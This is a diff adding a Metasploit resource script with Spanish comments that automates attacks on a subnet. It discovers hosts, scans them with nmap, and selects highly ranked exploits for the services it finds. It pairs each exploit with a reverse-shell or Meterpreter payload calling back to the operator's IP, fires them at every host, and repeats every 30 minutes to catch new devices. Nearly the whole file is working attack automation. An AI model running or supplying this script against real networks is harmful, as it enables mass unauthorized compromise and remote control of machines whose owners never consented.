@@ -1,0 +1,846 @@
+<ruby>
+
+
+###############################
+# PARAMETROS DE CONFIGURACIÓN #
+###############################
+def print_options()
+	if($verbose == 1)
+		puts("")
+		puts("====================== OPTIONS ======================")
+		print_status("These are the options you can use before running this resource:")
+		print_status("set RHOSTS --> You can put here the network you want to test(192.168.0.1/24) or just the Ips of the devices you want to test (separate by spaces).")
+		print_status("set LHOST --> These has to be your Ip address.")
+		print_status("set NMAPOPTSDISC --> You can put here the options you want to use when discovering with nmap.")
+		print_status("set VERBOSE --> Default is 1, change it to any other value to deactivate it.")
+		print_status("set LOOP --> Default is 1. With this option the resource will nave end and it will search for new devaces every looptime seconds. Change this value to deactivate it.")
+		print_status("set LOOPTIME --> Default is 30min. This just matters when LOOP's value is 1.")
+		print_status("set FULLSCANNER --> Default is false. Change this value tu true if you want nmap to scan the hosts in a more intensive way(it will also take more time to scan each host).")
+		print_status("set NOHTTP --> Default is true. Change this value to false if want to try to exploit the http services found (it will take much more time).")
+		print_status("set USEBASICDISCOVERY --> Default is false. Change this value is you want to use the resource 'simple_basic_discovery' (you must have it downloaded in the correct folder).")
+		puts("")
+		puts("")
+		print_status("Please be sure that the RHOSTS and LPORT settings are correct.")
+		puts("")
+		sleep(2)
+	end
+end
+print_options()
+
+
+## Subnet a atacar
+if (framework.datastore['RHOSTS'] == nil)
+	puts "Enter subnet or host(s) --> Ej: 192.168.0.1/24  or  192.168.0.156 192.168.0.172 >"  
+	STDOUT.flush  
+	subnet = gets.chomp  
+	run_single("setg RHOSTS #{subnet}")
+end
+
+## Ip que ataca
+if (framework.datastore['LHOST'] == nil)
+	puts "Enter your Ip --> Ej:192.168.0.157 >"  
+	STDOUT.flush  
+	ip = gets.chomp  
+	run_single("setg LHOST #{ip}")
+end
+
+## Por si se quieren meter parámetros propios, sino se usan los de por defecto
+if (framework.datastore['NMAPOPTSDISC'] != nil)
+	$nmapoptsdisc = framework.datastore['NMAPOPTSDISC']
+else
+	$nmapoptsdisc = "-sP -n -sn -T4"
+end
+
+#default to 15 Threads
+if (framework.datastore['THREADS'] == nil)
+	run_single("setg THREADS 15")
+end
+
+## Si se quiere verboso
+if (framework.datastore['VERBOSE'] != nil) 
+	$verbose = framework.datastore['VERBOSE']
+else
+	$verbose = 1
+end
+
+## Si se quiere que nunca pare
+if (framework.datastore['LOOP'] != nil) 
+	$loop = framework.datastore['LOOP']
+else
+	$loop = 1
+end
+
+
+## Tiempo entre cada loop
+if (framework.datastore['LOOPTIME'] != nil) 
+	loop_time = framework.datastore['LOOPTIME']
+else
+	loop_time = 1800 #Media hora entre cada ejecucuión del código
+end
+
+## Si se quiere escanear más a fondo, aumenta considerablemente el tiempo de espera
+if (framework.datastore['FULLSCANNER'] != nil)
+	$fullscanner =  framework.datastore['FULLSCANNER']
+else
+	$fullscanner = false
+end
+
+# Si es TRUE, NO atacamos al servicio http
+if (framework.datastore['NOHTTP'] != nil)
+	$nohhtp =  framework.datastore['NOHTTP']
+else
+	$nohttp = true
+end
+
+## Si se quiere usar nessusse tiene que dar el UUID de la política a utilizar
+#NOT IN USE YET
+if (framework.datastore['UUIDPOLNESSUS'] != nil)
+	$uuidpolnessus =  framework.datastore['UUIDPOLNESSUS']
+else
+	$uuidpolnessus = false
+end
+
+## Si se quiere usar Open Vas
+#NOT IN USE YET
+if (framework.datastore['USEOPENVAS'] != nil)
+	$useopenvas =  framework.datastore['USEOPENVAS']
+else
+	$useopenvas = false
+end
+
+##Si se quiere usar basic discovery, se usa al acabar de escanear y atacar
+if (framework.datastore['USEBASICDISCOVERY'] != nil)
+	$usebasicdiscovery =  framework.datastore['USEBASICDISCOVERY']
+else
+	$usebasicdiscovery = false
+end
+
+
+
+
+###### Funciones extra ##########
+
+
+## Según la marca de os del host con este método decidimos que tipo de os es
+#  para manejarlo mejor con el programa
+def spec_os(os_str)
+	os_str = os_str.downcase
+	if os_str.upcase.include?("WINDOWS")
+		return "windows"
+	elsif os_str.upcase.include?("LINUX")
+		return "linux"
+	elsif os_str.upcase.include?("MAC")
+		return "osx"
+	elsif os_str.upcase.include?("SOLARIS")
+		return "solaris"
+	elsif os_str.upcase.include?("UNIX")
+		return "unix"
+	elsif os_str.upcase.include?("ANDROID")
+		return "android"
+	elsif os_str.upcase.include?("IOS")
+		return "ios"
+	else
+		return nil
+	end
+end
+
+
+##Se asegura de que el exploit puede cargar con algun payload interesante
+def search_payload(exploit_path, create_exploit)
+	windows = ['windows/meterpreter/reverse_tcp', 'windows/x64/meterpreter_reverse_tcp', 'windows/shell_reverse_tcp', 'windows/x64/shell_reverse_tcp']
+	linux   = ['linux/x86/reverse_tcp','linux/x64/shell_reverse_tcp']
+	osx     = ['osx/x86/shell_reverse_tcp','osx/x64/shell_reverse_tcp']
+	solaris = ['solaris/x86/shell_reverse_tcp']
+	unix 	= ['cmd/unix/interact','cmd/unix/generic','cmd/unix/reverse','cmd/unix/bind_perl','cmd/unix/bind_perl_ipv6','cmd/unix/reverse_perl','cmd/unix/reverse_perl_ssl','cmd/unix/reverse_ssl_double_telnet']
+	php     = ['php/meterpreter_reverse_tcp']
+	multi   = ['java/meterpreter/reverse_tcp']
+	generic = ['generic/shell_reverse_tcp']
+
+	if ( exploit_path.include?("windows") )
+		windows.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	elsif ( exploit_path.include?("linux") )
+		linux.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	elsif ( exploit_path.include?("osx") )
+		osx.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	elsif ( exploit_path.include?("solaris") )
+		solaris.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	end
+	if ( exploit_path.include?("unix") )
+		unix.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	end
+	if ( exploit_path.include?("php") )
+		php.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	end
+	if ( exploit_path.include?("multi") )
+		multi.each do |payload|
+			if create_exploit.is_payload_compatible?(payload)
+				return payload
+			end
+		end
+	end
+	generic.each do |payload|
+		if create_exploit.is_payload_compatible?(payload)
+			return payload
+		end
+	end
+	#puts ("RESULTADO Payload resultado: NULL")
+	return nil
+end
+# Test and see if we have a database connected
+begin
+	framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+	print_error("Database connection isn't established")
+	return
+end
+
+
+# Se asegura de que el programa no sobrecargue el ordenador en ningun momento (aunque sería raro)
+def jobwaiting(maxjobs)	#thread handling for poor guys
+	while(framework.jobs.keys.length > maxjobs)
+		::IO.select(nil, nil, nil, 2.5)
+		if($verbose == 1)
+			print_error("waiting for finishing some modules... active jobs: #{framework.jobs.keys.length} / threads: #{framework.threads.length}")
+		framework.jobs.keys.each do |id_job|
+			puts("#{framework.jobs[id_job].name}")
+		end
+		end
+	end
+end
+
+
+# Elimina todos los jobs activos
+def deletejobs()
+	framework.jobs.keys.each do |job_id|
+		puts("Killing: #{framework.jobs[job_id].name}")
+		run_single("kill #{job_id}")
+	end
+end
+
+
+#Presenta los datos del host que va a ser atacado
+def present_host(dic_host)
+	puts("   OS = #{dic_host.values[0]["os"]}")
+	puts("   SERVICES:")
+	dic_host.values[0]["services"].each do |service|
+		puts("        #{service.keys[0]}")
+		service.values[0].each do |exploit|
+			puts("            #{exploit["path"]}")
+		end
+	end
+	puts("")
+
+end
+
+
+#Comprueba si queremos hacer un ataque de red o a unos hosts determinados en funcion de los rhosts introducidos
+def is_net_attack()
+	rhosts = $RHOSTS
+	if ( rhosts.include?("/") )
+		return true
+	else
+		return false
+	end
+end
+
+
+
+
+############ FUNCIONES PRINCIPALES ##############
+
+#####
+##Busca los HOSTS activos en la red
+#####
+def host_discovery()
+	puts("")
+	puts ("==========================================")
+	puts ("-------- Starting HOSTS discovery --------")
+	puts ("==========================================")
+
+	puts("Executing payload: auxiliary/scanner/discovery/ipv6_neighbor on #{framework.datastore['RHOSTS']}")
+	run_single("use auxiliary/scanner/discovery/ipv6_neighbor")
+	run_single("run -j")
+	puts ("Executing: db_nmap #{$nmapoptsdisc} #{framework.datastore['RHOSTS']}")
+	run_single("db_nmap #{$nmapoptsdisc} #{framework.datastore['RHOSTS']}")
+
+
+	puts ("==========================================")
+	puts ("-------- HOST discovery completed --------")
+	puts ("==========================================")
+	puts("")
+end
+
+
+
+#####
+#Escaneamos y atacamos de 8 en 8 de esta forma no hay que esperar a escanear a todos antes de poder atacar
+#####
+def scanning(is_net_attack_var)
+	scanned_ids = $scanned_ids
+	scan_ids_now =[]
+	max_hosts = $max_hosts
+
+	puts("")
+	puts ("======================================================")
+	puts ("-------- Starting HOSTS and SERVICES scanning --------")
+	puts ("======================================================")
+	puts("")
+
+	nmap_hosts=""
+	openvas_hosts=""
+	hosts_dic=[]
+	cont=0
+
+	if (!is_net_attack_var) #Si no es una ataque a la red sino a hosts, simplemente scaneamos esos hosts
+		nmap($RHOSTS)
+		cont = 1 #Un valor distinto de 0 para que no acabe el programa
+	else
+		# Selecionamos los hosts que vayamos a escanear pero solo los que aún no hayamos escaneado
+		framework.db.workspace.hosts.each do |host|
+			next if( scanned_ids.include?("#{host.id}") )
+			break if ( cont >= max_hosts )
+
+			scan_ids_now.push(host.id)
+			nmap_hosts += "#{host.address} "
+			#openvas_hosts += "#{host.address},"
+			cont += 1
+		end
+
+		if (cont == 0) #Si no hay ningun host nuevo que escanear, devolvemos 0 y pasamos
+			return 0
+		end
+		nmap(nmap_hosts)
+		#nessus()
+		#openvas(openvas_hosts)
+	end
+
+	# Después de escanearlos, sacamos y guardamos toda la info que tenemos
+	framework.db.workspace.hosts.each do |host|
+		next if( ! scan_ids_now.include?(host.id) and is_net_attack_var ) #Si es un ataque directo a hosts, nos interesa hacer un diccionario de todos porque solo habremos escaneado a los que queremos
+		host_info={}
+		host_comp={}
+		host_info["os"] = spec_os("#{host.os_name}")
+		host_info["mac"] = "#{host.mac}"
+		host_info["address"] = "#{host.address}"
+	   	host_info["services"] = []
+		host_comp[host.id] = host_info
+		hosts_dic.push(host_comp)
+	end
+
+	if ( !is_net_attack_var or cont < $max_hosts or framework.db.workspace.hosts.length == (scanned_ids.length + scan_ids_now.length) ) #Si no completamos el numero máximo de hosts a atacar, o sí lo completamos, pero no quedan más
+		$rerun = false #De esta forma declaramos que ya hemos escaneado y atacado a todos los host de la red y hay que empezar de nuevo
+	end
+	puts ("======================================================")
+	puts ("-------- HOSTS and SERVICES scanning completed -------")
+	puts ("======================================================")
+	puts("")
+
+	$hosts_dic = hosts_dic
+	$scanned_ids = scanned_ids
+
+	return cont
+end
+
+
+
+###
+##Usa Nmap para escanear los servicios
+###
+def nmap(nmap_hosts)
+	############
+	### Nmap ###
+	############
+	puts("Running auxiliary/scanner/discovery/udp_probe")
+	run_single("use auxiliary/scanner/discovery/udp_probe")
+	run_single("set RHOSTS #{nmap_hosts}")
+	run_single("run -j")
+	nmap_verbose = ""
+	if ($verbose == 1)
+		nmap_verbose = "-v"
+	end
+	if ($fullscanner == true)
+		puts("Executing db_nmap -sV --version-intensity 9 -sC -O --osscan-guess -Pn -sS -p - -T4 --data-length 8 #{nmap_verbose} #{nmap_hosts}")
+		run_single("db_nmap -sV --version-intensity 9 -sC -O --osscan-guess -Pn -sS -p - -T4  --data-length 8 #{nmap_verbose} #{nmap_hosts}")
+	else
+		puts("Executing db_nmap -sS -sV -sC -O --osscan-guess -Pn -T4 #{nmap_hosts}")
+		run_single("db_nmap -sS -sV -sC -O --osscan-guess -Pn -T4 #{nmap_hosts} ")
+	end
+end
+
+
+###
+##Usa Nessus para escanear todos los hosts
+###
+def nessus()
+	############
+	## NESSUS ##
+	############
+	#Lanza nessus a todos los hosts descubiertos --> Falta ver cómo lanzar el comando nessus_scan_launch
+	#if ($uuidpolnessus != false)
+	#		nessus = run_single("nessus_db_scan #{$uuidpolnessus} all all")
+	#		if (nessus == false)
+	#			print_error("Nessus Policy UUID not valid!")
+	#		else
+	#			
+	#		end
+	#	end
+end
+
+
+###
+##Usa Open Vas para escanear todos los hosts
+###
+def openvas(openvas_hosts)
+	#############
+	## OpenVas ##
+	#############
+	# Lanzamos OpenVas a todos los hosts descubiertos
+	#if ($useopenvas != false)
+	#	run_single("openvas_target_delete 0") #Para eliminar posibles targets ya creados. Cunaod no hay targets, el primero se crea en el ID 0.
+	#	run_single("openvas_target_delete 0")
+	#	run_single("openvas_target_delete 0")
+	#	run_single("openvas_target_delete 0")
+	#	run_single("openvas_target_delete 0")
+	#	run_single("openvas_target_create all_discovered #{openvas_hosts} auto")
+	#
+	#	run_single("openvas_task_delete 0")
+	#	run_single("openvas_task_delete 0")
+	#	run_single("openvas_task_delete 0")
+	#	run_single("openvas_task_delete 0")
+	#	run_single("openvas_task_delete 0")
+	#	if ($fullscanner != true)
+	#		run_single("openvas_task_create all_discovered_scan auto 4 0 ")
+	#	else
+	#		run_single("openvas_task_create all_discovered_scan auto 4 0 ")
+	#	run_single("openvas_task_start 0")
+	#	end
+	#end
+end
+
+
+
+###
+##Usa basic_discovery para sacar más info
+###
+def basic_discovery()
+	if $usebasicdiscovery
+		num_jobs = framework.jobs.keys.length
+		puts("")
+		puts("-----------------------------------------")
+		puts("--------- Using BASIC DISCOVERY ---------")
+		puts("-----------------------------------------")
+		puts("")
+		run_single("resource simple_basic_discovery.rc ")
+		jobwaiting(num_jobs)
+	end
+end
+
+
+
+#######
+# Busca todos los servicios encontrados y los agrupa en un diccionario en el que guarda el servicio y el ID de los hosts que lo usan
+#######
+def service_diccionary()
+	hosts_dic = $hosts_dic
+	scanned_ids = $scanned_ids
+	puts("")
+	puts ("======================================================")
+	puts ("------------ Starting search of EXPLOITS -------------")
+	puts ("======================================================")
+	puts("")
+
+	services = {}
+	framework.db.workspace.services.each do |service|
+		next if ( scanned_ids.include?("#{service.host_id}") ) #Ya habrá sido escaneado, así que no interesa
+		next if (service.state == "closed" or service.name == nil)
+		if (service.name =~ /smb/ or service.name =~ /microsoft-ds/ or service.name =~ /netbios/)
+			service_name = "smb"
+		elsif ( service.name =~ /postgre/ )
+			service_name = "postgre"
+		else
+			service_name = service.name.gsub(/-/,"") 
+		end
+		port = service.port
+
+		if services.keys.include?(service_name)
+			if services[service_name].keys.include?(port)
+				next if services[service_name][port].include?("#{service.host_id}")
+				services[service_name][port].push("#{service.host_id}")
+			else
+				services[service_name][port] = ["#{service.host_id}"]
+			end
+		else
+			services[service_name] = {}
+			services[service_name][port] = ["#{service.host_id}"]
+		end
+	end
+	print_status("Service dictionary completed.")
+	$services = services
+	puts("----------------------- SERVICES -----------------------")
+	if ($verbose == 1)
+		puts("#{$services}")
+	end
+	puts("")
+end
+
+
+
+#######
+# Busca los exploits que sean excelentes o geniales para los servicios encontrados 
+# También tienen que cumplir otros requisitos como:
+# => Que puedan llevar un payload que nos interese
+# => Que el puerto por defecto sea el puerto en el que lo hemos encontrado
+# => Que los datos que tenemos sean suficientes para los requisitos del exploit
+# => Que no se le puedan añadir una serie de parámetros que no nos interesa(ej srvhost indica que va a abrir un servidor en el ordenador)
+# => Que utilice unos parámetros determinados(por ej, si no tiene rhost significa que el ataque es local)
+# => Que el servicio no sea http ?
+#######
+def exploit_search()
+	hosts_dic = $hosts_dic
+	services = $services
+	services_expl = $services_expl
+
+	known_params = ["RHOST","RPORT","LHOST","LPORT","RHOSTS"]
+	banned_params = ["SRVHOST","SRVPORT"]
+	required_params = ["RHOST"]
+	search_exploits = framework.exploits.keys
+	services.keys.each do |service_name|
+		if $nohttp # Si es un servicio http, pasamos de él
+			next if (service_name =~ /http/)
+		end
+		services[service_name].keys.each do |service_port|
+			#Miramos a ver si ese servicio lo hemos investigado antes, y si es asi, lo copiamos de los resultados y listo
+			next if ( services_expl.keys.include?(service_name) and services_expl[service_name].keys.include?(service_port) )
+
+			exploits = search_exploits.select{ |i| i[service_name] }
+			exploits.each do |exploit|
+				create_exploit = framework.exploits.create(exploit)
+				begin
+					is_excellent = (create_exploit.rank_to_h == "excellent")
+					is_great = (create_exploit.rank_to_h == "great")
+					next if ( !is_excellent and !is_great )
+					payload = search_payload(exploit, create_exploit)
+					next if ( payload == nil )
+					next if ( create_exploit.target_port != nil and create_exploit.target_port.to_s != service_port.to_s ) #Serviría para filtrar los exploits también por puertos destino
+					
+					# Buscamos dentro de los datos que usa el exploit y si hay algun dato requerido que no es de los que poseemos
+					# o que no viene por defecto, el exploit queda descartado
+					# También, si el exploit tiene un parámetro dentro de los prohibidos, queda descartado
+					pass_service = false
+					create_exploit.options.keys.each do |key|
+						if ( create_exploit.options[key].required == true and !known_params.include?(create_exploit.options[key].name.upcase) and ( create_exploit.options[key].methods.to_s.include?(":default") and create_exploit.options[key].default == nil ) )		
+							pass_service = true
+						end
+						if ( banned_params.include?(create_exploit.options[key].name.upcase) )
+							pass_service = true
+						end
+					end
+					next if pass_service
+					# Mira a ver si los parametros requeridos existen en el exploit
+					# Para ello suponemos que no desde el ppio () pass_service = true)
+					# En caso de estar todos, lo pasamos a false
+					pass_service = true
+					cont = 0
+					create_exploit.options.keys.each do |key|
+						if ( required_params.include?(create_exploit.options[key].name.upcase) )
+							cont += 1
+						end
+						if ( cont == required_params.length )
+							pass_service = false
+						end
+					end
+					next if pass_service
+				rescue NoMethodError => e
+					#puts e.message            # Test de excepción
+	  				#puts e.backtrace.inspect   # ["nombre de fichero:linea de la excepción"]
+					next
+				end
+
+				if ($verbose == 1) 
+					puts("POSSIBLE USEFULL EXLPOIT: #{exploit}")
+				end
+				exploit_info = {}
+				exploit_info["path"] = "#{exploit}"
+				exploit_info["payload"] = "#{payload}"
+				exploit_info["rport"] = "#{create_exploit.target_port}"
+				exploit_info["supports_check?"] = "#{create_exploit.supports_check?}"
+				if  ( create_exploit.platform.platforms[0] == nil )
+					exploit_info["os"] = spec_os("#{exploit}")
+				else
+					exploit_info["os"] = spec_os("#{create_exploit.platform.platforms[0]}")
+				end
+
+				if ( services_expl.keys.include?(service_name) )
+					if ( services_expl[service_name].keys.include?(service_port) )
+						services_expl[service_name][service_port].push(exploit_info)
+					else
+						services_expl[service_name][service_port] = [exploit_info]
+					end
+				else
+					services_expl[service_name] = {}
+					services_expl[service_name][service_port] = [exploit_info]
+				end
+			end
+		end
+	end
+	print_status("Posible usefull exploits found")
+	$services_expl = services_expl
+	puts	puts("------------------------- EXPLOITS/SERVICES -----------------------")
+	if ($verbose == 1)
+		puts("#{$services_expl}")
+	end
+	puts("")
+end
+
+
+
+#Une cada hosts con los posibles exploits utiles.
+def host_exploit()
+	hosts_dic = $hosts_dic
+	services = $services
+	services_expl = $services_expl
+
+	print_status("Linking exploits with host/service")
+	#######
+	# Guarda los exploits útiles para cada servicio de cada host
+	#######
+	services.keys.each do |service_name| 	#Recorremos los nombres de los servicios guardados
+		services[service_name].keys.each do |service_port|		#Sacamos el ID de los host de cada servicio
+			services[service_name][service_port].each do |id|
+				hosts_dic.each do |host_dic_id| 	#Sacamos el ID de cada hosts
+					next if ("#{host_dic_id.keys[0]}" != "#{id}" )		#Buscamos el host cuyo ID y el del servicio coincidan
+					serv_dic = {}
+					serv_dic[service_name] = []
+					host_dic_id.values[0]["services"].unshift(serv_dic)	#Creamos una lista dentro de host_dic que luego rellenaremos con los exploits usables, con el unshift lo que hacemos el meter el nuevo servicio en la posicion 0, de esta forma sabemos en que posicion estará el servicio dentro del array de servicios
+					os_tar = host_dic_id.values[0]["os"]		#Scamos el os del host
+					begin
+						services_expl[service_name][service_port].each do |exploit|
+							os_exp = exploit["os"]	#Sacamos el os de cada exploit	
+							if ( os_tar == os_exp or exploit["path"].include?("multi/") or (os_tar != "windows" and os_exp == "unix") )#Comparamos os del exploit y host para ver si nos sirve o vemos si el exploit es para multi
+								host_dic_id.values[0]["services"][0][service_name].push(exploit)	#En caso de que sirva, lo guardamos
+							end
+						end
+					rescue NoMethodError
+						if ( $verbose == 1)
+							print_error("No se encontraron exploits para #{service_name}")
+						end
+					end
+				end
+			end
+		end
+	end
+	puts("")
+	puts("")
+	puts("------------------------ EXPLOITS/HOSTS -----------------------")
+	puts("")
+	if ( $verbose == 1 )
+		print_status("Sir, WE ARE READY")
+		print_status("You should listen to this song while we work for the benefit of the empire: https://www.youtube.com/watch?v=-bzWSJG93P8")
+	end
+	$hosts_dic = hosts_dic
+end
+
+
+
+#Explota todos los hosts del diccionario hosts_dic con los exploits encontrados
+def exploit()
+	hosts_dic = $hosts_dic
+	scanned_ids = $scanned_ids
+	puts("")
+	puts ("======================================================")
+	puts ("------------------- HACKING TIME ---------------------")
+	puts ("======================================================")
+	puts("#{hosts_dic}")
+	lport_ini = $lport_ini
+	#Primero eliminamos los jobs para que no se nos quede el programa eternamente esperando
+	num_ses = framework.sessions.keys.length #numero de sesiones inicial para no creer que hackeamos a la primera
+	#Seteamos como objetivo cada host, y dentro de este recorremos todos los servicios y todos los exploits encontrados para esos servicios
+	#De forma que si el numero de sesiones aumenta en 1 suponemos que lo hemos logrado hackear.
+	#Siempre sabemos que exploits estan en uso ya que si aumenta en 1 una sesion y desaparece un exploit, sera que ese exploit es el que nos ha dado la sesion
+	hosts_dic.each do |id_host|
+		scanned_ids.push("#{id_host.keys[0]}") #Para saber que ya hemos atacado a este host
+		#id_host["hacked"] = ""
+		jobwaiting(0)
+		hacked = false
+		ip_address = id_host.values[0]["address"]
+		puts("")
+		puts("")
+		puts("---------------------------------------------------")
+		print_status("Trying to hack #{ip_address}")
+		run_single("setg RHOST #{ip_address}")
+		run_single("setg RHOSTS #{ip_address}")
+		present_host(id_host)
+		next if ( id_host.values[0]["services"].length == 0)
+		id_host.values[0]["services"].each do |service|
+			service.values[0].each do |exploit|
+				next if hacked
+				puts("")
+				if( framework.sessions.keys.length > num_ses )
+					hacked = true
+					puts("")
+					puts("/========================================================/")					
+					print_status("GREAT JOB, WE MADE IT!")
+					print_status("Sir, accept this SESSION as gift from your empire.")
+					puts("/========================================================/")
+					puts("")
+					num_ses = framework.sessions.keys.length
+=begin				
+					jobs_after={}
+					framework.jobs.keys.each do |id_job|
+						jobs_after[framework.jobs[id_job].name]=id_host
+					end
+					jobs.keys.each do |exploit|
+						if ( !jobs_after.keys.include?(exploit) )
+							hosts_dic.each do |host_id|
+								if host_id.keys[0].to_s == jobs[exploit].to_s
+									host_id["hacked"] = exploit
+									print_status("GREAT JOB, WE MADE IT, #{jobs[exploit]} HAS BEEN HACKED")
+									print_status("#{exploit}")
+									puts("")
+									num_ses = framework.sessions.keys.length
+									next if (host_id.keys[0].to_s == id_host.keys[0].to_s) #Si el host hackeado es el mismo que seguimos intentando hackear,pasamos al siguiente
+								end
+							end
+						end
+					end
+=end
+				end
+				path_expl = exploit["path"]
+				payload_expl = exploit["payload"]
+				puts("use #{path_expl}")
+				run_single("use #{path_expl}")
+				puts("set LPORT #{lport_ini}")
+				run_single("set LPORT #{lport_ini}")
+				lport_ini += 1
+				puts("set PAYLOAD #{payload_expl}")
+				run_single("set PAYLOAD #{payload_expl}")
+				puts("run -j")
+				run_single("run -j")
+=begin
+				framework.jobs.keys.each do |id_job|
+					jobs[framework.jobs[id_job].name]=id_host.keys[0]
+				end
+=end
+				if ($verbose == 1)
+					puts("Exploits activos: #{framework.jobs.keys.length}")
+				end
+			end
+		end
+	end
+	$lport_ini = lport_ini
+	$scanned_ids = scanned_ids
+end
+
+
+
+
+
+
+
+
+
+
+
+
+#####################
+##### EJECUCIÓN #####
+#####################
+
+$scanned_ids=[]
+$services_expl = {}
+$max_hosts = 8
+$lport_ini = 4110
+$RHOSTS = framework.datastore['RHOSTS']
+
+puts("")
+puts("-------------------------------------------------")
+puts("This is the network you are going to test: #{framework.datastore['RHOSTS']}")
+puts("and your Ip is #{framework.datastore['LHOST']}")
+puts("-------------------------------------------------")
+puts("")
+puts("")
+sleep(2)
+#Creamos un nuevo workspace en el que almacenar la nueva sesión
+t = Time.new
+workspace = t.to_s.gsub(' ','_') #cambia los espacios por guiones bajos
+run_single("workspace -a #{workspace}")
+run_single("workspace #{workspace}")
+while (true)
+	t_start = Time.new
+	is_net_attack_var = is_net_attack() # Comprueba si queremos escanear la red o hacer un ataque a unos hosts determinados
+	if is_net_attack_var
+		$rerun = true
+		run_single("unsetg RHOSTS")
+		run_single("setg RHOSTS #{$RHOSTS}")
+	else
+		attack_hosts = $RHOSTS.split(" ")
+		run_single("unsetg RHOSTS")
+		run_single("setg RHOSTS #{attack_hosts[0]}/24") # Si no lo lanzamos con /24 no lo guarda en la abse de datos de metasploit
+	end
+	host_discovery()
+
+	while ($rerun)
+		num_hosts = scanning(is_net_attack_var) #Escaneamos un numero de hosts igual a max hosts
+
+		if (num_hosts == 0)
+			print_status("Any new device has been found in the network")
+			break
+		end
+
+		if ($rerun == false)
+			basic_discovery() #Usamos basic discovery EN LA ULTIMA RONDA si así está marcado
+		end
+
+		service_diccionary() #Creamos el diccionario de servicios descubiertos
+
+		exploit_search() #Buscamos exploits para los servicios descubiertos
+
+		host_exploit() #Asociamos los exploits descubiertos a cada host
+
+		deletejobs()
+
+		exploit() # Atacamos a todos los hosts
+	end
+
+	break if ($loop != 1 or !is_net_attack_var)
+
+	t_finish = Time.new
+	while( t_finish < (t_start+loop_time) )
+		sleep(300)
+		t_finish = Time.new
+		if($verbose == 1)
+			print_status("There are #{t_start+loop_time-t_finish} seconds left til next round.")
+		end	
+	end
+end
+
+run_single("unset rhosts")
+run_single("unsetg rhosts")
+
+
+</ruby>
+
